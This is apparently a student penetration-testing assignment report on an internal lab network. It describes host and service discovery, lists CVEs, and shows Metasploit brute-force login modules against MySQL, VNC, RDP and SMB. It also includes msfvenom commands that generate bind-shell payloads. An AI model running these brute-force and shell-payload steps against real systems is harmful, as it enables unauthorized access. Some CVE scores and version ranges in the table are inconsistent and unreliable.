# Internal Network Penetraion Testing

## Table of Contents

- [Table of Contents](#Table-of-Contents)
- [Scope](#Scope)
 - [Host Discovery](#Host-Discovery)
- [Service Discovery and Port Scanning](#Service-Discovery-and-Port-Scanning)
- [Vulnerability_Scanning](#Vulnerability_Scanning)
-  [Web Based Attack Surface](#Web-Based-Attack-Surface)
- [CVSS v3.0 Reference Table](#CVSS-v3.0-Reference-Table)
  ## Scope
 The scope of engagement comprises of an internal network 10.10.10.0/24 and a domain https://virtualinfosecafrica.com

  ## Host Discovery

**Host discovery** involves detecting which devices on a network are currently active or "live." This is typically the initial phase of network scanning and security evaluations, helping to identify the devices that are available for further examination. Once identified, these devices can be analyzed for vulnerabilities, services, or open ports.

### Key Aspects of Host Discovery:

1. **Purpose**:
   - **Network Mapping**: Detect and list all devices (e.g., computers, servers, routers) on a network to create a visual representation of connected systems.
   - **Network Inventory**: Maintain a record of devices on the network for effective management and security.
   - **Target Identification**: In penetration testing or network scanning, identify which devices can be further examined for potential vulnerabilities.

2. **Common Techniques**:
   Host discovery often involves sending different types of requests or probes to devices and analyzing their responses. Some common techniques are:

   - **Ping Sweep**: Send ICMP Echo Request packets (known as "ping") to a range of IP addresses. Devices that reply with an ICMP Echo Reply are considered active. Note that firewalls may block or not respond to ICMP requests.

   - **ARP Request (Address Resolution Protocol)**: Use ARP requests on local networks to discover devices. When a device receives an ARP request for its IP address, it responds with its MAC address, indicating it is online.

   - **TCP/UDP Probing**: Send TCP SYN (synchronize) packets or UDP packets to specific ports on devices to see if they respond. If a device responds (e.g., with a SYN/ACK or RST packet for TCP), it is considered active.

   - **Port Scanning**: Attempt to connect to specific ports, such as port 80 (HTTP) or port 22 (SSH). A response from the host indicates it is active.

3. **Tools for Host Discovery**:
   - **Nmap**: A popular tool for host discovery that supports various techniques (ICMP, TCP, ARP, etc.). It can be customized to bypass firewalls or optimize scanning.
     - Example Nmap command for host discovery:
       ```bash
       nmap -sn 10.10.10.0/24
       ```
       The `-sn` option disables port scanning and focuses solely on discovering live hosts.

4. **Challenges**:
   - **Firewalls**: Firewalls may block ping requests or limit responses to certain probes, complicating host discovery.
   - **Stealth**: In penetration testing or ethical hacking, host discovery should be performed discreetly to avoid detection by intrusion detection systems (IDS) or network administrators.

### Why Host Discovery Matters:
- **Efficiency**: Host discovery allows for focusing on live hosts rather than scanning the entire network, saving time and resources.
- **Security Monitoring**: Helps network administrators identify unauthorized or rogue devices that could pose security risks.
- **Penetration Testing**: Essential for ethical hacking to determine which devices to target for vulnerability assessment.

In summary, host discovery is the process of identifying active devices on a network to facilitate further actions such as vulnerability scanning, service detection, or network management.

![Host Discovery](online_host.png)

A subdomain enumeration can be demonstrated using a tool like **sublist3r** with the domain provided in the scope.

![Sublist3r](DNSbrute.png)

 ## Service Discovery and Port Scanning

**Service discovery** and **port scanning** are essential components of network security assessments, vulnerability management, and penetration testing. They help determine what services are running on network devices and which ports are open, providing a basis for identifying potential vulnerabilities or misconfigurations.

### Reasons for Service Discovery and Port Scanning:

#### 1. **Identify Running Services on a Host**:
   - **Service Discovery**: This involves finding out which network services (e.g., HTTP, SSH, FTP, DNS) are operational on a host. Each service listens on a specific port (e.g., HTTP on port 80, SSH on port 22), and understanding these services is crucial for assessing how a host interacts with the network.
     - **Example**: A web server may run an HTTP service on ports 80 or 443, while a MySQL database service might operate on port 3306.

   - **Port Scanning**: This technique checks for open, closed, or filtered ports on a host. Open ports suggest that a service is available and potentially reachable. By scanning ports, you can identify which services are actively accepting connections.
     - **Example**: A scan revealing open ports 22 (SSH) and 80 (HTTP) suggests that the host is running an SSH service and a web server.

#### 2. **Assess Security and Vulnerabilities**:
   - **Detect Vulnerabilities**: Some services might be outdated or misconfigured, presenting security risks. Identifying the version of a service running on a port (through service discovery) helps in assessing if known vulnerabilities are present.
     - **Example**: Finding an old version of SMB running on a server might indicate susceptibility to the EternalBlue exploit (MS17-010).

   - **Misconfigurations**: Port scanning can uncover misconfigurations such as unnecessary open ports or services that should not be accessible externally, which can pose security risks.
     - **Example**: An exposed database or RDP service on the internet, instead of being restricted to internal access, represents a significant security vulnerability.

#### 3. **Network Inventory and Monitoring**:
   - **Mapping the Network**: Service discovery and port scanning offer a snapshot of available services and ports on network devices, which helps in maintaining an accurate network inventory.
   - **Monitoring Network Changes**: Regular scans allow administrators to detect unauthorized services or newly opened ports, indicating potential security breaches or network changes.

#### 4. **Penetration Testing and Ethical Hacking**:
   - **Target Identification**: For penetration testing, these methods identify potential targets by revealing active services and open ports, necessary for exploiting vulnerabilities.
     - **Example**: If an FTP service is detected, a penetration tester might try to exploit default credentials or specific vulnerabilities associated with FTP.

   - **Attack Surface Analysis**: Knowing which services are exposed helps map the attack surface and assess how to gain unauthorized access.

#### 5. **Troubleshooting and Network Diagnostics**:
   - **Ensuring Services are Available**: Port scanning helps confirm that services are functioning as expected and that necessary ports are open. If a service is down, a port scan might show the port as closed, signaling a potential issue with the service or firewall configuration.
   - **Detecting Firewalls and Filtering**: These techniques help diagnose if firewalls or security devices are blocking traffic. Ports appearing as "filtered" suggest that a firewall is preventing access.

### Importance of These Steps:

#### 1. **Security Posture Assessment**:
   - Without service discovery and port scanning, understanding the security posture of a host or network is incomplete. These steps reveal exposed services and accessible ports that could be exploited by attackers.

#### 2. **Reducing the Attack Surface**:
   - Identifying unnecessary or vulnerable services and open ports allows administrators to secure or disable them, reducing the attack surface and minimizing unauthorized access opportunities.

#### 3. **Compliance and Best Practices**:
   - Many security frameworks and standards (e.g., PCI-DSS, HIPAA) mandate regular network scanning, vulnerability assessments, and service hardening. Service discovery and port scanning are crucial for meeting these requirements and ensuring a secure environment.

#### 4. **Proactive Defense**:
   - Since attackers use port scans and service discovery during their reconnaissance, performing these scans regularly helps administrators identify and address weaknesses before an attacker can exploit them, enhancing proactive defenses.

![Service Discovery](nmap_service_scan.png)

| Name| Description | 
| --- | --- | 
| CVE-2021-42013 | It was found that the fix for CVE-2021-41773 in Apache
HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to
map URLs to files outside the directories configured by Alias-like directives. If files
outside of these directories are not protected by the usual default configuration
"require all denied", these requests can succeed. If CGI scripts are also enabled for
these aliased pathes, this could allow for remote code execution. This issue only
affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.The severity is 10.|
| CVE-2021-26887 | <p>An elevation of privilege vulnerability exists in Microsoft Windows when Folder redirection has been enabled via Group Policy. When folder redirection file server is co-located with Terminal server, an attacker who successfully exploited the vulnerability would be able to begin redirecting another user's personal data to a created folder.</p> <p>To exploit the vulnerability, an attacker can create a new folder under the Folder Redirection root path and create a junction on a newly created User folder. When the new user logs in, Folder Redirection would start redirecting to the folder and copying personal data.</p> <p>This elevation of privilege vulnerability can only be addressed by reconfiguring Folder Redirection with Offline files and restricting permissions, and NOT via a security update for affected Windows Servers. See the <strong>FAQ</strong> section of this CVE for configuration guidance The severity is 7.</p>|
|  CVE-2020-14765   | Vulnerability in the MySQL Server product of Oracle MySQL
(component: Server: FTS). Supported versions that are affected are 5.6.49 and prior,
5.7.31 and prior and 8.0.21 and prior. Easily exploitable vulnerability allows low
privileged attacker with network access via multiple protocols to compromise
MySQL Server. Successful attacks of this vulnerability can result in unauthorized
ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL
Server. CVSS 3.1 Base Score 6.5 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N
AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).The severity score is 7.|
| CVE-2022-27502|  RealVNC VNC Server 6.9.0 through 5.1.0 for Windows allows local
privilege escalation because an installer repair operation executes %TEMP% files as
SYSTEM The severity score is 10.|
|  CVE-2005-1794 |Microsoft Terminal Server using Remote Desktop Protocol (RDP) 5.2 stores an RSA
private key in mstlsapi.dll and uses it to sign a certificate, which allows remoteattackers to spoof public keys of legitimate servers and conduct man-in-the-middle attacks.Vulnerability score is 7.9|
|  CVE-2023-51766 |Exim before 4.97.1 allows SMTP smuggling in certain PIPELINING/CHUNKING
configurations. Remote attackers can use a published exploitation technique to
inject e-mail messages with a spoofed MAIL FROM address, allowing bypass of an
SPF protection mechanism. This occurs because Exim supports <LF>.<CR><LF> but
some other popular e-mail servers do not. The severity score is 7.|
| CVE-2001-0554 | Buffer overflow in BSD-based telnetd telnet daemon on various operating systems
allows remote attackers to execute arbitrary commands via a set of options including
AYT (Are You There), which is not properly handled by the telrcv function.The severity score is 4.|
| CVE-2015-0240 | 	The Netlogon server implementation in smbd in Samba
3.5.x and 3.6.x before 3.6.25, 4.0.x before 4.0.25, 4.1.x before 4.1.17, and 4.2.x before
4.2.0rc5 performs a free operation on an uninitialized stack pointer, which allows
remote attackers to execute arbitrary code via crafted Netlogon packets that use the
ServerPasswordSet RPC API, as demonstrated by packets reaching the
_netr_ServerPasswordSet function in rpc_server/netlogon/srv_netlog_nt.c. The severity score is 7.|


  ## Vulnerability Scanning
  
Using my protocol specific file I created under service discovery, I scannned for vulnerabilities with the *Metasploit Auxilliary Module*

## Scanning for login vulnerabilities for the following services.

1. ### mysql:
steps:
> 1. msfconsole
>
> 2. search and use mysql_login
>
> 3. info
>
> 4. set USER_FILE userlist.txt
>
> 5. set PASS_FILE passlist.txt
>
>6. set RHOSTS 10.10.10.0/24
>
> 7. **run**


![alt text](my_sqllogin_pc_45.png.png)
![alt text](my_sqllogin_pc_5.png)



2. ### vnc:
steps:
> 1. msfconsole
>
> 2. search and use vnc_login
>
> 3. info
>
> 4. set USER_FILE userlist1.txt
>
> 5. set PASS_FILE passlist1.txt
>
>6. set RHOSTS 10.10.10.0/24
>
> 7. **run**

![alt text](vnc_login.png)  


3. ### rdp:
steps:
> 1. msfconsole
>
> 2. search and use rdp_login
>
> 3. info
>
> 7. **run**

![alt text](rdp_login.png)

4. ### smb:
steps:
> 1. msfconsole
>
> 2. search and use smb_login
>
> 3. info
>
> 4. set USER_FILE userlist2.txt
>
> 5. set PASS_FILE passlist2.txt
>
>6. set RHOSTS 10.10.10.0/24
>
> 7. **run**


![alt text](smb_login.png)


Generating custom wordlist using  **Cewl** from the domain given.

syntax used:
> cewl https://virtualinfosecafrica.com -w /home/leroymenorah/Desktop/Pent_assignment/cewl_wordlist.txt

![alt text](cewl_wordlist.png)


 # Web-Based Attack Surfaces


EyeWitness is a utility designed for capturing screenshots of web applications, launching RDP services, and opening VNC servers. It is particularly useful for identifying and reporting vulnerabilities, making it a valuable tool during reconnaissance and vulnerability assessments. Here is an example of how to use EyeWitness:

> eyewitness --timeout 15 -f urls.txt

![eyewitness](eyewitness.png)


![google screenshot](https.google.com)





## Generating Payloads


To generate a payload that can trigger a **TCP bind shell** with **msfvenom**, assuming the host is 10.10.10.55 and runs on an Apache Tomcat web server(Java based), we use the **syntax command**:

> msfvenom -p java/shell/bind_tcp LPORT=9005 RHOSTS=10.10.10.55 -f war -o payload.war

![alt text](payload1.png)




To generate a payload that can execute **base64** with **msfvenom**, assuming the host is 10.10.10.55 and runs a Python server, we use the **syntax command**:

> msfvenom -p python/shell_bind_tcp  LPORT=9005 RHOSTS=10.10.10.55 -f python -o payload.py


![alt text](payload2.png)






  ## CVSS v3.0 Reference Table 
  | Qualitative Rating | CVSS Score |
  |:-------------------:|:-----------:|
  | None informational | N/A |
  | Low | 0.1-3.9|
  | Medium | 4.0-6.9|
  | High | 7.0-8.9|
  | Critical | 9.0-10.0 |
  
